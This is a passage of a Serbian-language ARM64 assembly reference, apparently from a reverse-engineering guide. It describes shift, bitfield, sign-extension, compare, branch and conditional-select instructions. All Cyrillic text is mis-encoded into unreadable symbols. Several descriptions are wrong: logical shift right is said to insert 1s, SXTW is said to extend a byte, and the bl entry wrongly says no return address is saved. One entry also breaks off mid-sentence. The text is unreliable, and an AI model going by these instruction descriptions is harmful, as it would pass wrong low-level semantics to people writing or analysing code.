* –ü—Ä–∏–º–µ—Ä: `div x0, x1, x2` ‚Äî –û–≤–æ –¥–µ–ª–∏ –≤—Ä–µ–¥–Ω–æ—Å—Ç —É `x1` —Å–∞ `x2` –∏ —á—É–≤–∞ —Ä–µ–∑—É–ª—Ç–∞—Ç —É `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **–õ–æ–≥–∏—á–∫–æ –ø–æ–º–µ—Ä–∞—ö–µ –Ω–∞–ª–µ–≤–æ**: –î–æ–¥–∞—ò—Ç–µ 0 –∏–∑ –∫—Ä–∞—ò–∞ –ø–æ–º–µ—Ä–∞—ò—É—õ–∏ –æ—Å—Ç–∞–ª–µ –±–∏—Ç–æ–≤–µ –Ω–∞–ø—Ä–µ–¥ (–º–Ω–æ–∂–∏—Ç–µ —Å–∞ n-–ø—É—Ç–∞ 2)
* **–õ–æ–≥–∏—á–∫–æ –ø–æ–º–µ—Ä–∞—ö–µ —É–¥–µ—Å–Ω–æ**: –î–æ–¥–∞—ò—Ç–µ 1 –Ω–∞ –ø–æ—á–µ—Ç–∫—É –ø–æ–º–µ—Ä–∞—ò—É—õ–∏ –æ—Å—Ç–∞–ª–µ –±–∏—Ç–æ–≤–µ –Ω–∞–∑–∞–¥ (–¥–µ–ª–∏—Ç–µ —Å–∞ n-–ø—É—Ç–∞ 2 —É –Ω–µ–ø–æ—Ç–ø–∏—Å–∞–Ω–∏–º)
* **–ê—Ä–∏—Ç–º–µ—Ç–∏—á–∫–æ –ø–æ–º–µ—Ä–∞—ö–µ —É–¥–µ—Å–Ω–æ**: –ö–∞–æ **`lsr`**, –∞–ª–∏ —É–º–µ—Å—Ç–æ –¥–æ–¥–∞–≤–∞—ö–∞ 0, –∞–∫–æ —ò–µ –Ω–∞—ò–∑–Ω–∞—á–∞—ò–Ω–∏—ò–∏ –±–∏—Ç 1, **–¥–æ–¥–∞—ò—É —Å–µ 1** (–¥–µ–ª–∏—Ç–µ —Å–∞ n-–ø—É—Ç–∞ 2 —É –ø–æ—Ç–ø–∏—Å–∞–Ω–∏–º)
* **–ü–æ–º–µ—Ä–∏—Ç–µ —É–¥–µ—Å–Ω–æ**: –ö–∞–æ **`lsr`** –∞–ª–∏ —à—Ç–∞ –≥–æ–¥ –¥–∞ —Å–µ —É–∫–ª–æ–Ω–∏ —Å –¥–µ—Å–Ω–µ —Å—Ç—Ä–∞–Ω–µ, –¥–æ–¥–∞—ò–µ —Å–µ —Å –ª–µ–≤–µ
* **–ü–æ–º–µ—Ä–∏—Ç–µ —É–¥–µ—Å–Ω–æ —Å–∞ –ø—Ä–æ—à–∏—Ä–µ—ö–µ–º**: –ö–∞–æ **`ror`**, –∞–ª–∏ —Å–∞ –∑–∞—Å—Ç–∞–≤–∏—Ü–æ–º –ø—Ä–µ–Ω–æ—Å–∞ –∫–∞–æ "–Ω–∞—ò–∑–Ω–∞—á–∞—ò–Ω–∏—ò–∏ –±–∏—Ç". –î–∞–∫–ª–µ, –ø—Ä–µ–Ω–æ—Å–Ω–∞ –∑–∞—Å—Ç–∞–≤–∞ —Å–µ –ø–æ–º–µ—Ä–∞ –Ω–∞ –±–∏—Ç 31, –∞ —É–∫–ª–æ—ö–µ–Ω–∏ –±–∏—Ç —É –ø—Ä–µ–Ω–æ—Å–Ω—É –∑–∞—Å—Ç–∞–≤—É.
* **`bfm`**: **–ü—Ä–µ–º–µ—à—Ç–∞—ö–µ –±–∏—Ç–æ–≤–∞**, –æ–≤–µ –æ–ø–µ—Ä–∞—Ü–∏—ò–µ **–∫–æ–ø–∏—Ä–∞—ò—É –±–∏—Ç–æ–≤–µ `0...n`** –∏–∑ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ –∏ —Å—Ç–∞–≤—ô–∞—ò—É –∏—Ö —É –ø–æ–∑–∏—Ü–∏—ò–µ **`m..m+n`**. **`#s`** –æ–¥—Ä–µ—í—É—ò–µ **–ª–µ–≤—É –Ω–∞—ò–∑–Ω–∞—á–∞—ò–Ω–∏—ò—É –ø–æ–∑–∏—Ü–∏—ò—É –±–∏—Ç–∞**, –∞ **`#r`** –∫–æ–ª–∏—á–∏–Ω—É —Ä–æ—Ç–∞—Ü–∏—ò–µ —É–¥–µ—Å–Ω–æ.
* –ü—Ä–µ–º–µ—à—Ç–∞—ö–µ –±–∏—Ç–æ–≤–∞: `BFM Xd, Xn, #r`
* –ü–æ—Ç–ø–∏—Å–∞–Ω–æ –ø—Ä–µ–º–µ—à—Ç–∞—ö–µ –±–∏—Ç–æ–≤–∞: `SBFM Xd, Xn, #r, #s`
* –ù–µ–ø–æ—Ç–ø–∏—Å–∞–Ω–æ –ø—Ä–µ–º–µ—à—Ç–∞—ö–µ –±–∏—Ç–æ–≤–∞: `UBFM Xd, Xn, #r, #s`
* **–ò–∑–≤–ª–∞—á–µ—ö–µ –∏ —É–º–µ—Ç–∞—ö–µ –±–∏—Ç–æ–≤–∞:** –ö–æ–ø–∏—Ä–∞ –±–∏—Ç–Ω–æ –ø–æ—ô–µ –∏–∑ —Ä–µ–≥–∏—Å—Ç—Ä–∞ –∏ –∫–æ–ø–∏—Ä–∞ –≥–∞ —É –¥—Ä—É–≥–∏ —Ä–µ–≥–∏—Å—Ç–∞—Ä.
* **`BFI X1, X2, #3, #4`** –£–º–µ—Ç–Ω–∏—Ç–µ 4 –±–∏—Ç–∞ –∏–∑ X2 –∏–∑ 3. –±–∏—Ç–∞ X1
* **`BFXIL X1, X2, #3, #4`** –ò–∑–≤–ª–∞—á–∏ –∏–∑ 3. –±–∏—Ç–∞ X2 —á–µ—Ç–∏—Ä–∏ –±–∏—Ç–∞ –∏ –∫–æ–ø–∏—Ä–∞ –∏—Ö —É X1
* **`SBFIZ X1, X2, #3, #4`** –ü–æ—Ç–ø–∏—Å–∞–Ω–æ –ø—Ä–æ—à–∏—Ä—É—ò–µ 4 –±–∏—Ç–∞ –∏–∑ X2 –∏ —É–º–µ—Ç–∞ –∏—Ö —É X1 –ø–æ—á–∏—ö—É—õ–∏ –Ω–∞ –ø–æ–∑–∏—Ü–∏—ò–∏ –±–∏—Ç–∞ 3 –Ω—É–ª–∏—Ä–∞—ò—É—õ–∏ –¥–µ—Å–Ω–µ –±–∏—Ç–æ–≤–µ
* **`SBFX X1, X2, #3, #4`** –ò–∑–≤–ª–∞—á–∏ 4 –±–∏—Ç–∞ –ø–æ—á–∏—ö—É—õ–∏ –Ω–∞ –±–∏—Ç—É 3 –∏–∑ X2, –ø–æ—Ç–ø–∏—Å–∞–Ω–æ –∏—Ö –ø—Ä–æ—à–∏—Ä—É—ò–µ –∏ —Å—Ç–∞–≤—ô–∞ —Ä–µ–∑—É–ª—Ç–∞—Ç —É X1
* **`UBFIZ X1, X2, #3, #4`** –ù—É–ª–∏—Ä–∞ 4 –±–∏—Ç–∞ –∏–∑ X2 –∏ —É–º–µ—Ç–∞ –∏—Ö —É X1 –ø–æ—á–∏—ö—É—õ–∏ –Ω–∞ –ø–æ–∑–∏—Ü–∏—ò–∏ –±–∏—Ç–∞ 3 –Ω—É–ª–∏—Ä–∞—ò—É—õ–∏ –¥–µ—Å–Ω–µ –±–∏—Ç–æ–≤–µ
* **`UBFX X1, X2, #3, #4`** –ò–∑–≤–ª–∞—á–∏ 4 –±–∏—Ç–∞ –ø–æ—á–∏—ö—É—õ–∏ –Ω–∞ –±–∏—Ç—É 3 –∏–∑ X2 –∏ —Å—Ç–∞–≤—ô–∞ –Ω—É–ª–∏—Ä–∞–Ω–æ –ø—Ä–æ—à–∏—Ä–µ–Ω–∏ —Ä–µ–∑—É–ª—Ç–∞—Ç —É X1.
* **–ü—Ä–æ—à–∏—Ä–∏—Ç–µ –∑–Ω–∞–∫ –Ω–∞ X:** –ü—Ä–æ—à–∏—Ä–∏—Ç–µ –∑–Ω–∞–∫ (–∏–ª–∏ —Å–∞–º–æ –¥–æ–¥–∞—ò—Ç–µ 0 —É –Ω–µ–ø–æ—Ç–ø–∏—Å–∞–Ω–æ—ò –≤–µ—Ä–∑–∏—ò–∏) –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ –¥–∞ –±–∏—Å—Ç–µ –º–æ–≥–ª–∏ –¥–∞ –∏–∑–≤—Ä—à–∏—Ç–µ –æ–ø–µ—Ä–∞—Ü–∏—ò–µ —Å —ö–æ–º:
* **`SXTB X1, W2`** –ü—Ä–æ—à–∏—Ä–∏—Ç–µ –∑–Ω–∞–∫ –±–∞–π—Ç–∞ **–∏–∑ W2 —É X1** (`W2` —ò–µ –ø–æ–ª–æ–≤–∏–Ω–∞ `X2`) –¥–∞ –ø–æ–ø—É–Ω–∏—Ç–µ 64 –±–∏—Ç–∞
* **`SXTH X1, W2`** –ü—Ä–æ—à–∏—Ä–∏—Ç–µ –∑–Ω–∞–∫ 16-–±–∏—Ç–Ω–æ–≥ –±—Ä–æ—ò–∞ **–∏–∑ W2 —É X1** –¥–∞ –ø–æ–ø—É–Ω–∏—Ç–µ 64 –±–∏—Ç–∞
* **`SXTW X1, W2`** –ü—Ä–æ—à–∏—Ä–∏—Ç–µ –∑–Ω–∞–∫ –±–∞–π—Ç–∞ **–∏–∑ W2 —É X1** –¥–∞ –ø–æ–ø—É–Ω–∏—Ç–µ 64 –±–∏—Ç–∞
* **`UXTB X1, W2`** –î–æ–¥–∞—ò–µ 0 (–Ω–µ–ø–æ—Ç–ø–∏—Å–∞–Ω–æ) –Ω–∞ –±–∞–π—Ç **–∏–∑ W2 —É X1** –¥–∞ –ø–æ–ø—É–Ω–∏—Ç–µ 64 –±–∏—Ç–∞
* **`extr`:** –ò–∑–≤–ª–∞—á–∏ –±–∏—Ç–æ–≤–µ –∏–∑ –æ–¥—Ä–µ—í–µ–Ω–æ–≥ **–ø–∞—Ä–∞ —Ä–µ–≥–∏—Å—Ç–∞—Ä–∞ –∫–æ–Ω–∫–∞—Ç–µ–Ω–∏—Å–∞–Ω–∏—Ö**.
* –ü—Ä–∏–º–µ—Ä: `EXTR W3, W2, W1, #3` –û–≤–æ —õ–µ **–∫–æ–Ω–∫–∞—Ç–µ–Ω–∏—Å–∞—Ç–∏ W1+W2** –∏ –¥–æ–±–∏—Ç–∏ **–æ–¥ –±–∏—Ç–∞ 3 W2 –¥–æ –±–∏—Ç–∞ 3 W1** –∏ —Å–∞—á—É–≤–∞—Ç–∏ —É W3.
* **`cmp`**: **–ü–æ—Ä–µ—í–µ—ö–µ** –¥–≤–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞ –∏ –ø–æ—Å—Ç–∞–≤—ô–∞—ö–µ —É—Å–ª–æ–≤–Ω–∏—Ö –∑–∞—Å—Ç–∞–≤–∏—Ü–∞. –¢–æ —ò–µ **–∞–ª–∏–∞—Å `subs`** –ø–æ—Å—Ç–∞–≤—ô–∞—ò—É—õ–∏ —Ä–µ–≥–∏—Å—Ç–∞—Ä –¥–µ—Å—Ç–∏–Ω–∞—Ü–∏—ò–µ –Ω–∞ –Ω—É–ª—Ç–∏ —Ä–µ–≥–∏—Å—Ç–∞—Ä. –ö–æ—Ä–∏—Å–Ω–æ –∑–∞ –ø—Ä–æ–≤–µ—Ä—É –¥–∞ –ª–∏ —ò–µ `m == n`.
* –ü–æ–¥—Ä–∂–∞–≤–∞ **–∏—Å—Ç—É —Å–∏–Ω—Ç–∞–∫—Å—É –∫–∞–æ `subs`**
* –ü—Ä–∏–º–µ—Ä: `cmp x0, x1` ‚Äî –û–≤–æ –ø–æ—Ä–µ–¥–∏ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ —É `x0` –∏ `x1` –∏ –ø–æ—Å—Ç–∞–≤—ô–∞ —É—Å–ª–æ–≤–Ω–µ –∑–∞—Å—Ç–∞–≤–∏—Ü–µ —É —Å–∫–ª–∞–¥—É —Å —Ç–∏–º.
* **`cmn`**: **–ü–æ—Ä–µ—í–µ—ö–µ –Ω–µ–≥–∞—Ç–∏–≤–Ω–æ–≥** –æ–ø–µ—Ä–∞–Ω–¥–∞. –£ –æ–≤–æ–º —Å–ª—É—á–∞—ò—É —ò–µ **–∞–ª–∏–∞—Å `adds`** –∏ –ø–æ–¥—Ä–∂–∞–≤–∞ –∏—Å—Ç—É —Å–∏–Ω—Ç–∞–∫—Å—É. –ö–æ—Ä–∏—Å–Ω–æ –∑–∞ –ø—Ä–æ–≤–µ—Ä—É –¥–∞ –ª–∏ —ò–µ `m == -n`.
* **`ccmp`**: –£—Å–ª–æ–≤–Ω–æ –ø–æ—Ä–µ—í–µ—ö–µ, —Ç–æ —ò–µ –ø–æ—Ä–µ—í–µ—ö–µ –∫–æ—ò–µ —õ–µ –±–∏—Ç–∏ –∏–∑–≤—Ä—à–µ–Ω–æ —Å–∞–º–æ –∞–∫–æ —ò–µ –ø—Ä–µ—Ç—Ö–æ–¥–Ω–æ –ø–æ—Ä–µ—í–µ—ö–µ –±–∏–ª–æ —Ç–∞—á–Ω–æ –∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ —õ–µ –ø–æ—Å—Ç–∞–≤–∏—Ç–∏ nzcv –±–∏—Ç–æ–≤–µ.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> –∞–∫–æ x1 != x2 –∏ x3 < x4, —Å–∫–æ—á–∏ –Ω–∞ func
* –û–≤–æ —ò–µ –∑–∞—Ç–æ —à—Ç–æ —õ–µ **`ccmp`** –±–∏—Ç–∏ –∏–∑–≤—Ä—à–µ–Ω–æ —Å–∞–º–æ –∞–∫–æ —ò–µ **–ø—Ä–µ—Ç—Ö–æ–¥–Ω–∏ `cmp` –±–∏–æ `NE`**, –∞–∫–æ –Ω–∏—ò–µ, –±–∏—Ç–æ–≤–∏ `nzcv` —õ–µ –±–∏—Ç–∏ –ø–æ—Å—Ç–∞–≤—ô–µ–Ω–∏ –Ω–∞ 0 (—à—Ç–æ –Ω–µ—õ–µ –∑–∞–¥–æ–≤–æ—ô–∏—Ç–∏ `blt` –ø–æ—Ä–µ—í–µ—ö–µ).
* –û–≤–æ —Å–µ –º–æ–∂–µ –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ –∏ –∫–∞–æ `ccmn` (–∏—Å—Ç–æ –∞–ª–∏ –Ω–µ–≥–∞—Ç–∏–≤–Ω–æ, –∫–∞–æ `cmp` –ø—Ä–æ—Ç–∏–≤ `cmn`).
* **`tst`**: –ü—Ä–æ–≤–µ—Ä–∞–≤–∞ –¥–∞ –ª–∏ —Å—É –±–∏–ª–æ –∫–æ—ò–µ –æ–¥ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ –ø–æ—Ä–µ—í–µ—ö–∞ –æ–±–µ 1 (—Ä–∞–¥–∏ –∫–∞–æ ANDS –±–µ–∑ —á—É–≤–∞—ö–∞ —Ä–µ–∑—É–ª—Ç–∞—Ç–∞ –±–∏–ª–æ –≥–¥–µ). –ö–æ—Ä–∏—Å–Ω–æ —ò–µ –ø—Ä–æ–≤–µ—Ä–∏—Ç–∏ —Ä–µ–≥–∏—Å—Ç–∞—Ä —Å–∞ –≤—Ä–µ–¥–Ω–æ—à—õ—É –∏ –ø—Ä–æ–≤–µ—Ä–∏—Ç–∏ –¥–∞ –ª–∏ —ò–µ –±–∏–ª–æ –∫–æ—ò–∏ –æ–¥ –±–∏—Ç–æ–≤–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—Ö —É –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ 1.
* –ü—Ä–∏–º–µ—Ä: `tst X1, #7` –ü—Ä–æ–≤–µ—Ä–∞–≤–∞ –¥–∞ –ª–∏ —ò–µ –±–∏–ª–æ –∫–æ—ò–∏ –æ–¥ –ø–æ—Å–ª–µ–¥—ö–∞ 3 –±–∏—Ç–∞ X1 1
* **`teq`**: XOR –æ–ø–µ—Ä–∞—Ü–∏—ò–∞ –±–µ–∑ —á—É–≤–∞—ö–∞ —Ä–µ–∑—É–ª—Ç–∞—Ç–∞
* **`b`**: –ù–µ–ø–æ—Å—Ä–µ–¥–Ω–∞ –≥—Ä–∞–Ω–∞
* –ü—Ä–∏–º–µ—Ä: `b myFunction`
* –ò–º–∞—ò—Ç–µ –Ω–∞ —É–º—É –¥–∞ –æ–≤–æ –Ω–µ—õ–µ –ø–æ–ø—É–Ω–∏—Ç–∏ —Ä–µ–≥–∏—Å—Ç–∞—Ä –∑–∞ –ø–æ–≤—Ä–∞—Ç–∞–∫ —Å–∞ –∞–¥—Ä–µ—Å–æ–º –ø–æ–≤—Ä–∞—Ç–∫–∞ (–Ω–∏—ò–µ –ø—Ä–∏–∫–ª–∞–¥–Ω–æ –∑–∞ –ø–æ–∑–∏–≤–µ –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–∞ –∫–æ—ò–∏ —Ç—Ä–µ–±–∞ –¥–∞ —Å–µ –≤—Ä–∞—Ç–µ)
* **`bl`**: **–ì—Ä–∞–Ω–∫–∞** —Å–∞ –ø–æ–≤—Ä–∞—Ç–∫–æ–º, –∫–æ—Ä–∏—Å—Ç–∏ —Å–µ –∑–∞ **–ø–æ–∑–∏–≤** **–ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–∞**. –ß—É–≤–∞ **–∞–¥—Ä–µ—Å—É –ø–æ–≤—Ä–∞—Ç–∫–∞ —É `x30`**.
* –ü—Ä–∏–º–µ—Ä: `bl myFunction` ‚Äî –û–≤–æ –ø–æ–∑–∏–≤–∞ —Ñ—É–Ω–∫—Ü–∏—ò—É `myFunction` –∏ —á—É–≤–∞ –∞–¥—Ä–µ—Å—É –ø–æ–≤—Ä–∞—Ç–∫–∞ —É `x30`.
* –ò–º–∞—ò—Ç–µ –Ω–∞ —É–º—É –¥–∞ –æ–≤–æ –Ω–µ—õ–µ –ø–æ–ø—É–Ω–∏—Ç–∏ —Ä–µ–≥–∏—Å—Ç–∞—Ä –∑–∞ –ø–æ–≤—Ä–∞—Ç–∞–∫ —Å–∞ –∞–¥—Ä–µ—Å–æ–º –ø–æ–≤—Ä–∞—Ç–∫–∞ (–Ω–∏—ò–µ –ø—Ä–∏–∫–ª–∞–¥–Ω–æ –∑–∞ –ø–æ–∑–∏–≤–µ –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–∞ –∫–æ—ò–∏ —Ç—Ä–µ–±–∞ –¥–∞ —Å–µ –≤—Ä–∞—Ç–µ)
* **`blr`**: **–ì—Ä–∞–Ω–∫–∞** —Å–∞ –ø–æ–≤—Ä–∞—Ç–∫–æ–º —É —Ä–µ–≥–∏—Å—Ç–∞—Ä, –∫–æ—Ä–∏—Å—Ç–∏ —Å–µ –∑–∞ **–ø–æ–∑–∏–≤** **–ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–∞** –≥–¥–µ —ò–µ —Ü–∏—ô **–Ω–∞–≤–µ–¥–µ–Ω** —É **—Ä–µ–≥–∏—Å—Ç—Ä—É**. –ß—É–≤–∞ –∞–¥—Ä–µ—Å—É –ø–æ–≤—Ä–∞—Ç–∫–∞ —É `x30`. (–û–≤–æ —ò–µ
* –ü—Ä–∏–º–µ—Ä: `blr x1` ‚Äî –û–≤–æ –ø–æ–∑–∏–≤–∞ —Ñ—É–Ω–∫—Ü–∏—ò—É —á–∏—ò–∞ –∞–¥—Ä–µ—Å–∞ —ò–µ —Å–∞–¥—Ä–∂–∞–Ω–∞ —É `x1` –∏ —á—É–≤–∞ –∞–¥—Ä–µ—Å—É –ø–æ–≤—Ä–∞—Ç–∫–∞ —É `x30`.
* **`ret`**: **–í—Ä–∞—Ç–∏ —Å–µ** –∏–∑ **–ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–∞**, –æ–±–∏—á–Ω–æ –∫–æ—Ä–∏—Å—Ç–µ—õ–∏ –∞–¥—Ä–µ—Å—É —É **`x30`**.
* –ü—Ä–∏–º–µ—Ä: `ret` ‚Äî –û–≤–æ —Å–µ –≤—Ä–∞—õ–∞ –∏–∑ —Ç—Ä–µ–Ω—É—Ç–Ω–æ–≥ –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–∞ –∫–æ—Ä–∏—Å—Ç–µ—õ–∏ –∞–¥—Ä–µ—Å—É –ø–æ–≤—Ä–∞—Ç–∫–∞ —É `x30`.
* **`b.<cond>`**: –£—Å–ª–æ–≤–Ω–µ –≥—Ä–∞–Ω–µ
* **`b.eq`**: **–ì—Ä–∞–Ω–∫–∞ –∞–∫–æ —ò–µ —ò–µ–¥–Ω–∞–∫–æ**, –Ω–∞ –æ—Å–Ω–æ–≤—É –ø—Ä–µ—Ç—Ö–æ–¥–Ω–µ `cmp` –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–µ.
* –ü—Ä–∏–º–µ—Ä: `b.eq label` ‚Äî –ê–∫–æ —ò–µ –ø—Ä–µ—Ç—Ö–æ–¥–Ω–∞ `cmp` –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–∞ –ø—Ä–æ–Ω–∞—à–ª–∞ –¥–≤–µ —ò–µ–¥–Ω–∞–∫–µ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏, –æ–≤–æ —Å–∫–æ—á–∏ –Ω–∞ `label`.
* **`b.ne`**: **–ì—Ä–∞–Ω–∫–∞ –∞–∫–æ –Ω–∏—ò–µ —ò–µ–¥–Ω–∞–∫–æ**. –û–≤–∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–∞ –ø—Ä–æ–≤–µ—Ä–∞–≤–∞ —É—Å–ª–æ–≤–Ω–µ –∑–∞—Å—Ç–∞–≤–∏—Ü–µ (–∫–æ—ò–µ —Å—É –ø–æ—Å—Ç–∞–≤—ô–µ–Ω–µ –ø—Ä–µ—Ç—Ö–æ–¥–Ω–æ–º –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–æ–º –ø–æ—Ä–µ—í–µ—ö–∞), –∏ –∞–∫–æ —É–ø–æ—Ä–µ—í–∏–≤–∞–Ω–µ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ –Ω–∏—Å—É —ò–µ–¥–Ω–∞–∫–µ, –≥—Ä–∞–Ω–∞ —Å–µ –Ω–∞ –æ–∑–Ω–∞–∫—É –∏–ª–∏ –∞–¥—Ä–µ—Å—É.
* –ü—Ä–∏–º–µ—Ä: –ù–∞–∫–æ–Ω `cmp x0, x1` –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–µ, `b.ne label` ‚Äî –ê–∫–æ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ —É `x0` –∏ `x1` –Ω–∏—Å—É —ò–µ–¥–Ω–∞–∫–µ, –æ–≤–æ —Å–∫–æ—á–∏ –Ω–∞ `label`.
* **`cbz`**: **–ü–æ—Ä–µ—í–µ—ö–µ –∏ –≥—Ä–∞–Ω–∞—ö–µ –Ω–∞ –Ω—É–ª—É**. –û–≤–∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–∞ –ø–æ—Ä–µ–¥–∏ —Ä–µ–≥–∏—Å—Ç–∞—Ä —Å–∞ –Ω—É–ª–æ–º, –∏ –∞–∫–æ —Å—É —ò–µ–¥–Ω–∞–∫–µ, –≥—Ä–∞–Ω–∞ —Å–µ –Ω–∞ –æ–∑–Ω–∞–∫—É –∏–ª–∏ –∞–¥—Ä–µ—Å—É.
* –ü—Ä–∏–º–µ—Ä: `cbz x0, label` ‚Äî –ê–∫–æ —ò–µ –≤—Ä–µ–¥–Ω–æ—Å—Ç —É `x0` –Ω—É–ª–∞, –æ–≤–æ —Å–∫–æ—á–∏ –Ω–∞ `label`.
* **`cbnz`**: **–ü–æ—Ä–µ—í–µ—ö–µ –∏ –≥—Ä–∞–Ω–∞—ö–µ –Ω–∞ –Ω–µ–Ω—É–ª–æ**. –û–≤–∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–∞ –ø–æ—Ä–µ–¥–∏ —Ä–µ–≥–∏—Å—Ç–∞—Ä —Å–∞ –Ω—É–ª–æ–º, –∏ –∞–∫–æ –Ω–∏—Å—É —ò–µ–¥–Ω–∞–∫–µ, –≥—Ä–∞–Ω–∞ —Å–µ –Ω–∞ –æ–∑–Ω–∞–∫—É –∏–ª–∏ –∞–¥—Ä–µ—Å—É.
* –ü—Ä–∏–º–µ—Ä: `cbnz x0, label` ‚Äî –ê–∫–æ —ò–µ –≤—Ä–µ–¥–Ω–æ—Å—Ç —É `x0` –Ω–µ–Ω—É–ª–∞, –æ–≤–æ —Å–∫–æ—á–∏ –Ω–∞ `label`.
* **`tbnz`**: –¢–µ—Å—Ç–∏—Ä–∞—ò –±–∏—Ç –∏ –≥—Ä–∞–Ω–∞—ò –Ω–∞ –Ω–µ–Ω—É–ª–æ
* –ü—Ä–∏–º–µ—Ä: `tbnz x0, #8, label`
* **`tbz`**: –¢–µ—Å—Ç–∏—Ä–∞—ò –±–∏—Ç –∏ –≥—Ä–∞–Ω–∞—ò –Ω–∞ –Ω—É–ª—É
* –ü—Ä–∏–º–µ—Ä: `tbz x0, #8, label`
* **–£—Å–ª–æ–≤–Ω–µ –æ–ø–µ—Ä–∞—Ü–∏—ò–µ –∏–∑–±–æ—Ä–∞**: –û–≤–æ —Å—É –æ–ø–µ—Ä–∞—Ü–∏—ò–µ —á–∏—ò–µ –ø–æ–Ω–∞—à–∞—ö–µ –≤–∞—Ä–∏—Ä–∞ —É –∑–∞–≤–∏—Å–Ω–æ—Å—Ç–∏ –æ–¥ —É—Å–ª–æ–≤–Ω–∏—Ö –±–∏—Ç–æ–≤–∞.
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> –ê–∫–æ —ò–µ —Ç–∞—á–Ω–æ, X0 = X1, –∞–∫–æ –Ω–∏—ò–µ, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> –ê–∫–æ —ò–µ —Ç–∞—á–Ω–æ, Xd = Xn, –∞–∫–æ –Ω–∏—ò–µ, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> –ê–∫–æ —ò–µ —Ç–∞—á–Ω–æ, Xd = Xn + 1, –∞–∫–æ –Ω–∏—ò–µ, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> –ê–∫–æ —ò–µ —Ç–∞—á–Ω–æ, Xd = Xn, –∞–∫–æ –Ω–∏—ò–µ, Xd = NOT(Xm)
* `cinv Xd, Xn, cond` -> –ê–∫–æ —ò–µ —Ç–∞—á–Ω–æ, Xd = NOT(Xn), –∞–∫–æ –Ω–∏—ò–µ, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> –ê–∫–æ —ò–µ —Ç–∞—á–Ω–æ, Xd = Xn, –∞–∫–æ –Ω–∏—ò–µ, Xd = - Xm
* `cneg Xd, Xn, cond` -> –ê–∫–æ —ò–µ —Ç–∞—á–Ω–æ, Xd = - Xn, –∞–∫–æ –Ω–∏—ò–µ, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> –ê–∫–æ —ò–µ —Ç–∞—á–Ω–æ, Xd = 1, –∞–∫–æ –Ω–∏—ò–µ, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> –ê–∫–æ —ò–µ —Ç–∞—á–Ω–æ, Xd = \<—Å–≤–∏ 1>, –∞–∫–æ –Ω–∏—ò–µ, Xd = 0
* **`adrp`**: –ò–∑—Ä–∞—á—É–Ω–∞—Ç–∏ **–∞–¥—Ä–µ—Å—É —Å—Ç—Ä–∞–Ω–∏—Ü–µ —Å–∏–º–±–æ–ª–∞** –∏ —Å–∞—á—É–≤–∞—Ç–∏ —ò–µ —É —Ä–µ–≥–∏—Å—Ç—Ä—É.
* –ü—Ä–∏–º–µ—Ä: `adrp x0, symbol` ‚Äî –û–≤–æ –∏–∑—Ä–∞—á—É–Ω–∞–≤–∞ –∞–¥—Ä–µ—Å—É —Å—Ç—Ä–∞–Ω–∏—Ü–µ —Å–∏–º–±–æ–ª–∞ `symbol` –∏ —á—É–≤–∞ —ò–µ —É `x0`.
* **`ldrsw`**: **–£—á–∏—Ç–∞—ò—Ç–µ** –ø–æ—Ç–ø–∏—Å–∞–Ω—É **32-–±–∏—Ç–Ω—É** –≤—Ä–µ–¥–Ω–æ—Å—Ç –∏–∑ –º–µ–º–æ—Ä–∏—ò–µ –∏ **–ø–æ—Ç–ø–∏—Å–∞–Ω–æ –ø—Ä–æ—à–∏—Ä–∏—Ç–µ –Ω–∞ 64** –±–∏—Ç–∞.
* –ü—Ä–∏–º–µ—Ä: `ldrsw x0, [x1]` ‚Äî –û–≤–æ —É—á–∏—Ç–∞–≤–∞ –ø–æ—Ç–ø–∏—Å–∞–Ω—É 32-–±–∏—Ç–Ω—É –≤—Ä–µ–¥–Ω–æ—Å—Ç –∏–∑ –º–µ–º–æ—Ä–∏—ò—Å–∫–µ –ª–æ–∫–∞—Ü–∏—ò–µ –Ω–∞ –∫–æ—ò—É —É–∫–∞–∑—É—ò–µ `x1`, –ø–æ—Ç–ø–∏—Å–∞–Ω–æ —ò–µ –ø—Ä–æ—à–∏—Ä—É—ò–µ –Ω–∞ 64 –±–∏—Ç–∞ –∏ —á—É–≤–∞ —É `x0`.
* **`stur`**: **–°–∞—á—É–≤–∞—ò—Ç–µ –≤—Ä–µ–¥–Ω–æ—Å—Ç —Ä–µ–≥–∏—Å—Ç—Ä–∞ –Ω–∞ –º–µ–º–æ—Ä–∏—ò—Å–∫–æ—ò –ª–æ–∫–∞—Ü–∏—ò–∏**, –∫–æ—Ä–∏—Å—Ç–µ—õ–∏ –æ—Ñ—Å–µ—Ç –∏–∑ –¥—Ä—É–≥–æ–≥ —Ä–µ–≥–∏—Å—Ç—Ä–∞.
